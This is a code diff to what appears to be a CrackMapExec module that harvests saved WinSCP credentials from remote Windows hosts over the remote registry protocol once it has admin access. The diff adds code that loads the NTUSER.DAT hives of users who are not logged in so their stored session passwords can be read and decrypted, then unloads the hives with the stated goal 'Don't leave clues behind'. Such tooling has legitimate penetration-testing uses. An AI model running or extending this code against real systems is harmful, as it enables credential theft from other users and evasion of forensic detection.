@@ -94,6 +94,9 @@ class CMEModule:
 
     # ==================== Handle Registry ====================
     def registrySessionExtractor(self, context, connection, userObject, sessionName):
+        """
+        Extract Session information from registry
+        """
         try:
             remoteOps = RemoteOperations(connection.conn, False)
             remoteOps.enableRegistry()
@@ -112,6 +115,8 @@ class CMEModule:
                 context.log.debug("Session found but no Password is stored!")
                 password = ""
 
+            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+
             if password:
                 decPassword = self.decryptPasswd(context, hostName, userName, password)
             else:
@@ -122,16 +127,19 @@ class CMEModule:
             traceback.print_exc()
         finally:
             remoteOps.finish()
-            
         return "ERROR IN SESSION EXTRACTION"
-    def findAllUsersInRegistry(self, context, connection):
+
+    def findAllLoggedInUsersInRegistry(self, context, connection):
+        """
+        Checks whether User already exist in registry and therefore are logged in
+        """
         userObjects = []
 
         try:
             remoteOps = RemoteOperations(connection.conn, False)
             remoteOps.enableRegistry()
 
-            # Enumerate all Users on System
+            # Enumerate all logged in and loaded Users on System
             ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
             regHandle = ans['phKey']
 
@@ -158,19 +166,112 @@ class CMEModule:
             remoteOps.finish()
         return userObjects
 
+    def findAllUsers(self, context, connection):
+        """
+        Find all User on the System in HKEY_LOCAL_MACHINE
+        """
+        userObjects = []
+
+        try:
+            remoteOps = RemoteOperations(connection.conn, False)
+            remoteOps.enableRegistry()
+
+            # Enumerate all Users on System
+            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
+            regHandle = ans['phKey']
+
+            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList')
+            keyHandle = ans['phkResult']
+
+            data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
+            users = data['lpcSubKeys']
+
+            # Get User Names
+            for i in range(users):
+                userObjects.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)['lpNameOut'].split('\x00')[:-1][0])
+            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+        except:
+            context.log.error("Error handling Users in registry")
+            traceback.print_exc()
+        finally:
+            remoteOps.finish()
+        return userObjects
+
+    def loadMissingUsers(self, context, connection, unloadedUserObjects):
+        """
+        Extract Information for not logged in Users and then loads them into registry.
+        """
+        try:
+            remoteOps = RemoteOperations(connection.conn, False)
+            remoteOps.enableRegistry()
+
+            for userObject in unloadedUserObjects:
+                # Extract profile Path of NTUSER.DAT
+                ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
+                regHandle = ans['phKey']
+                
+                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\' + userObject)
+                keyHandle = ans['phkResult']
+
+                userProfilePath = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'ProfileImagePath')[1].split('\x00')[:-1][0]
+                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+
+                # Load Profile
+                ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
+                regHandle = ans['phKey']
+
+                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, '')
+                keyHandle = ans['phkResult']
+
+                context.log.debug("LOAD USER INTO REGISTRY: " + userObject)
+                rrp.hBaseRegLoadKey(remoteOps._RemoteOperations__rrp, keyHandle, userObject, userProfilePath + "\\" + "NTUSER.DAT")
+                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+        finally:
+            remoteOps.finish()
+
+    def unloadMissingUsers(self, context, connection, unloadedUserObjects):
+        """
+        If some User were not logged in at the beginning we unload them from registry. Don't leave clues behind...
+        """
+        try:
+            remoteOps = RemoteOperations(connection.conn, False)
+            remoteOps.enableRegistry()
+
+            # Unload Profile
+            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
+            regHandle = ans['phKey']
+
+            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, '')
+            keyHandle = ans['phkResult']
+
+            for userObject in unloadedUserObjects:
+                context.log.debug("UNLOAD USER FROM REGISTRY: " + userObject)
+                try:
+                    rrp.hBaseRegUnLoadKey(remoteOps._RemoteOperations__rrp, keyHandle, userObject)
+                except:
+                    traceback.print_exc()
+            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+        finally:
+            remoteOps.finish()
+
     def registryDiscover(self, context, connection):
         try:
             remoteOps = RemoteOperations(connection.conn, False)
             remoteOps.enableRegistry()
 
             # Enumerate all Users on System
-            userObjects = self.findAllUsersInRegistry(context, connection)
+            userObjects = self.findAllLoggedInUsersInRegistry(context, connection)
+            allUserObjects = self.findAllUsers(context, connection)
+
+            # Users which must be loaded into registry:
+            unloadedUserObjects = list(set(userObjects).symmetric_difference(set(allUserObjects)))
+            self.loadMissingUsers(context, connection, unloadedUserObjects)
 
             # Retrieve how many sessions are stored in registry from each UserObject
             ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
             regHandle = ans['phKey']
 
-            for userObject in userObjects:
+            for userObject in allUserObjects:
                 try:
                     ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, userObject + '\\Software\\Martin Prikryl\\WinSCP 2\\Sessions')
                     keyHandle = ans['phkResult']
@@ -191,11 +292,11 @@ class CMEModule:
                         self.printCreds(context, self.registrySessionExtractor(context, connection, userObject, sessionName))
                 except Exception as e:
                     if str(e).find('ERROR_FILE_NOT_FOUND'):
-                        # TODO change error to debug
-                        context.log.error("No WinSCP config found in registry")
+                        context.log.debug("No WinSCP config found in registry for user {}".format(userObject))
                     else:
                         context.log.error("Unexpected error:")
                         traceback.print_exc()
+            self.unloadMissingUsers(context, connection, unloadedUserObjects)
         finally:
             remoteOps.finish()
 
@@ -205,9 +306,5 @@ class CMEModule:
         pass
 
     def on_admin_login(self, context, connection):
-        #context.log.error("Hello World")
-        #context.log.info("Info")
-        #context.log.highlight("HIGHLIGHT")
-        #context.log.success("SUCCESS")
         self.registryDiscover(context, connection)
 
